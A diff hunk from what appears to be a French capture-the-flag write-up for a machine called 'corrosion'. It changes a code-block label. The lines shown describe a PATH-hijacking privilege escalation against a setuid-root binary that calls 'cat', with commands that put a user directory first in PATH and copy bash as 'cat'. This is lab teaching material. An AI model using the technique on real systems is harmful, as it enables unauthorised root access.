@@ -181,7 +181,7 @@ Cela ressemble à une faille de PATH classique car le programme *cat* est appel�
 
 Il s'avère en fait que le binaire est aussi setuid root par conséquent l'exploitation est possible directement.  
 
-```plain
+```console
 randy@corrosion:~/tools$ export PATH=/home/randy/tools:$PATH
 randy@corrosion:~/tools$ vi /etc/hosts
 randy@corrosion:~/tools$ cp /bin/bash cat
